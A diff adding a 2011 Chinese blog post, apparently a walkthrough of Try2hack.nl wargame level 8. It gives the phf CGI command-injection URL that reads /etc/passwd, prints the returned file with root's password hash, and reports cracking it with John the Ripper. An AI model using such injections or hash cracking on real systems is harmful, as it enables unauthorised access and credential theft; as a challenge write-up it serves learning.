@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7 ie" lang="en"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8 ie" lang="en"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js lt-ie9 ie" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<title>【趣味Hack】Try2hack.nl第八关——phf漏洞和破解Linux密码</title>
+	<meta name="author" content="HackFisher">
+	<link href='/assets/themes/the-program/css/style.css' rel="stylesheet" media="all">
+	<link href="http://feeds.feedburner.com/" rel="alternate" title="【趣味Hack】Try2hack.nl第八关——phf漏洞和破解Linux密码" type="application/atom+xml">
+	<script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.0.6/modernizr.min.js"></script>
+</head>
+<body>
+
+<div id="page" class="hentry">
+	<header class="the-header">
+		<div class="unit-head">
+			<div class="unit-inner unit-head-inner">
+				<nav class="nav-global">
+					<ul>
+						<li class="logo"><a href="/">HackFisher</a></li>
+						<li class="archive"><a href="/archive.html">archive</a></li>
+						<li class="page"><a href="/pages.html">pages</a></li>
+						<li class="category"><a href="/categories.html">categories</a></li>
+						<li class="tag"><a href="/tags.html">tags</a></li>
+						<li class="about"><a href="/about.html">about</a></li>
+						<li class="forkme"><div><iframe src="http://markdotto.github.com/github-buttons/github-btn.html?user=HackFisher&repo=hackfisher.github.com&type=fork&count=true"
+									allowtransparency="true" frameborder="0" scrolling="0" width="95px" height="20px"></iframe></div></li>
+					</ul>
+				</nav>
+			</div><!-- unit-inner -->
+		</div><!-- unit-head -->
+	</header>
+	<div class="body" role="main">
+		<div class="unit-body">
+			<div class="unit-inner unit-body-inner">
+				<div class="entry-content">
+					
+<article class="unit-article layout-post">
+	<div class="unit-inner unit-article-inner">
+		<div class="content">
+			<header>
+				<div class="unit-head">
+					<div class="unit-inner unit-head-inner">
+						<h1 class="h2 entry-title">【趣味Hack】Try2hack.nl第八关——phf漏洞和破解Linux密码</h1>
+					</div><!-- unit-inner -->
+				</div><!-- unit-head -->
+			</header>
+
+			<div class="bd">
+				<div class="entry-content">
+					第八关地址：
+
+<a href="http://www.try2hack.nl/levels/level8-balnrg.xhtml">http://www.try2hack.nl/levels/level8-balnrg.xhtml</a>
+
+a. 打开页面，可以看到是让你输入用户名和密码。检查html，javascript和报头，没有什么特殊的地方。
+
+b. 随便输入一个用户名密码，可以看到会跳转到下面这个地址，显示“Sorry, the login information could not be verified.”
+<pre escaped="true" lang="url" line="1">http://www.try2hack.nl/cgi-bin/phf</pre>
+c. 看到结尾的phf有点奇怪，上网搜一下，发现有一个<a href="http://insecure.org/sploits/phf-cgi.html">漏洞</a>与这个有关系，机会来了，按照描述，输入下面的url
+<pre escaped="true" lang="url" line="1">http://www.try2hack.nl/cgi-bin/phf?Qalias=x%0A/bin/cat%20/etc/passwd</pre>
+d. 浏览器返回内容，看起来有点熟悉，结合url的格式，发现这个不是linux系统下的<a href="http://flash7783.javaeye.com/blog/583792">/etc/passwd</a>文件吗，上面的访问相当于执行了如下命令
+<pre escaped="true" lang="bash" line="1">/bin/cat /etc/passwd</pre>
+<pre escaped="true" lang="txt" line="1">root:khXGN7s.ldaJI:0:0::0:0:Charlie &amp;:/root:/usr/local/bin/bash
+daemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologin
+operator:*:2:5::0:0:System Operator:/:/sbin/nologin
+bin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologin
+tty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologin
+kmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologin
+games:*:7:13::0:0:Games pseudo-user:/usr/games:/sbin/nologin
+news:*:8:8::0:0:News Subsystem:/:/sbin/nologin
+man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologin
+sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologin
+smmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologin
+mailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/sbin/nologin
+bind:*:53:53::0:0:Bind Sandbox:/:/sbin/nologin
+uucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucico
+xten:*:67:67::0:0:X-10 daemon:/usr/local/xten:/sbin/nologin
+pop:*:68:6::0:0:Post Office Owner:/nonexistent:/sbin/nologin
+www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/sbin/nologin
+nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin
+root:khXGN7s.ldaJI:0:0::0:0:Charlie &amp;:/root:/usr/local/bin/bashdaemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologinoperator:*:2:5::0:0:System Operator:/:/sbin/nologinbin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologintty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologinkmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologingames:*:7:13::0:0:Games pseudo-user:/usr/games:/sbin/nologinnews:*:8:8::0:0:News Subsystem:/:/sbin/nologinman:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologinsshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologinsmmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologinmailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/sbin/nologinbind:*:53:53::0:0:Bind Sandbox:/:/sbin/nologinuucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucicoxten:*:67:67::0:0:X-10 daemon:/usr/local/xten:/sbin/nologinpop:*:68:6::0:0:Post Office Owner:/nonexistent:/sbin/nologinwww:*:80:80::0:0:World Wide Web Owner:/nonexistent:/sbin/nologinnobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin</pre>
+e. 最终的答案会不会与这个有关系呢，其他行都没什么特殊，只有第一行比较特殊，而且密码没有进行Shadow安全密码服务。我们用经典的<a href="http://www.openwall.com/john/">John The Ripper Password Cracker</a>来解决这个问题，得到密码arse。
+
+f. 输入用户名密码，拿到<a href="http://www.try2hack.nl/levels/level9-gnapei.xhtml">下一关</a>的入场劵。
+
+					<div class="meta">
+						<p class="date-publish">
+							Published: 
+							<date class="date-pub" title="2011-03-01T00:00:00+08:00" datetime="2011-03-01T00:00:00+08:00" pubdate>
+							<span class="month"><abbr>March</abbr></span>
+							<span class="day">01</span>
+							<span class="year">2011</span>
+							</date>
+						</p>
+						<ul class="list-category list-linear">
+							<li class="list-head">category: </li>
+							
+							
+
+
+  
+    
+  
+
+
+						</ul>
+						<ul class="list-tag list-linear">
+							<li class="list-head">tags: </li>
+							
+							
+
+
+  
+     
+    	<li><a href="/tags.html#CGI漏洞-ref">CGI漏洞 <span>1</span></a></li>
+     
+    	<li><a href="/tags.html#Cracker-ref">Cracker <span>1</span></a></li>
+     
+    	<li><a href="/tags.html#Hack-ref">Hack <span>8</span></a></li>
+     
+    	<li><a href="/tags.html#Linux-ref">Linux <span>1</span></a></li>
+     
+    	<li><a href="/tags.html#Password-ref">Password <span>1</span></a></li>
+     
+    	<li><a href="/tags.html#phf-cgi-ref">phf-cgi <span>1</span></a></li>
+     
+    	<li><a href="/tags.html#趣味Hack-ref">趣味Hack <span>9</span></a></li>
+    
+  
+
+
+
+						</ul>
+					</div><!-- meta -->
+				</div><!-- entry-content -->
+				<div class="misc-content">
+					<div class="social">
+						<ul class="list-linear">
+							<li><div class="twitter-tweet"><a href="https://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="hackfisher" data-lang="en">Tweet</a></div></li>
+							<li><div class="twitter-follow"><a href="https://twitter.com/hackfisher" class="twitter-follow-button" data-show-count="false" data-lang="en"></a></div></li>
+						</ul>
+					</div>
+					<div class="comment">
+					
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'jekyllbootstrap'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+					</div>
+				</div><!-- misc-content -->
+			</div><!-- bd -->
+			<footer class="unit-foot">
+				<div class="unit-inner unit-foot-inner">
+					<nav class="pagination">
+						<ul>
+							
+							<li class="prev"><a class="internal" rel="prev"  href="/blog/2011/03/try2hack-9th" title="View 【趣味Hack】Try2hack.nl第九关——修改Cookies">&laquo; 【趣味Hack】Try2hack.nl第九关——修改Cookies</a></li>
+							
+							
+							<li class="pipe"> | </li>
+							
+							
+							<li class="next"><a class="internal" rel="next"  href="/blog/2011/03/clojure-lisp-java-platform" title="View (? (= Clojure (+ Lisp Java-Platform)))">(? (= Clojure (+ Lisp Java-Platform))) &raquo;</a></li>
+							
+						</ul>
+					</nav>
+					<p class="gotop">
+						<a href="#page">Back to Top</a>
+					</p>
+				</div>
+			</footer>
+
+		</div><!-- content -->
+	</div><!-- unit-inner -->
+</article>
+
+
+				</div>
+			</div><!-- unit-inner -->
+		</div><!-- unit-body -->
+	</div><!-- body -->
+	<footer class="the-footer">
+		<div class="unit-foot">
+			<div class="unit-inner unit-foot-inner">
+				<div class="misc vcard">
+					<h4>about</h4>
+					<ul>
+						<li class="contact"><address><span class="author fn n">HackFisher</span> - <span class="fn email">hackfisher@gmail.com</span></address></li>
+						<li class="github"><a href="http://github.com/HackFisher/" rel="me">github.com/HackFisher</a></li>
+						<li class="twitter"><a href="http://twitter.com/hackfisher/" rel="me">twitter.com/hackfisher</a></li>
+						<li class="rss"><a href="http://hackfisher.info/rss.xml">Subscribe to RSS Feed</a></li>
+					</ul>
+				</div><!-- misc -->
+			</div><!-- unit-foot-inner -->
+		</div><!-- unit-foot -->
+	</footer>
+</div><!-- page -->
+<script>
+	(function(d, s) {
+		var js, fjs = d.getElementsByTagName(s)[0], load = function(url, id) {
+		if (d.getElementById(id)) {return;}
+		js = d.createElement(s); js.src = url; js.id = id;
+		fjs.parentNode.insertBefore(js, fjs);
+		};
+	load('//platform.twitter.com/widgets.js', 'tweetjs');
+	// load('https://apis.google.com/js/plusone.js', 'gplus1js'); // Checkout http://j.mp/ApDgMr for usage html for this is <div class="g-plusone" data-size="medium"></div>
+	// load('//connect.facebook.net/en_US/all.js#xfbml=1', 'fbjssdk'); // Checkout http://j.mp/wZw2xR for using open graph protorol html for this is <div class="fb-like" data-href="/blog/2011/03/try2hack_nl-8th" data-send="false" data-layout="button_count" data-width="450" data-show-faces="false" data-font="verdana"></div>
+	}(document, 'script'));
+</script>
+<script>
+/*! A fix for the iOS orientationchange zoom bug.Script by @scottjehl, rebound by @wilto. MIT License.*/
+(function(j){var i=j.document;if(!i.querySelectorAll){return}var l=i.querySelectorAll("meta[name=viewport]")[0],a=l&&l.getAttribute("content"),h=a+", maximum-scale=1.0",d=a+", maximum-scale=10.0",g=true,c=j.orientation,k=0;if(!l){return}function f(){l.setAttribute("content",d);g=true}function b(){l.setAttribute("content",h);g=false}function e(m){c=Math.abs(j.orientation);k=Math.abs(m.gamma);if(k>8&&c===0){if(g){b()}}else{if(!g){f()}}}j.addEventListener("orientationchange",f,false);j.addEventListener("deviceorientation",e,false)})(this);
+</script>
+  
+  
+</body>
+</html>
+
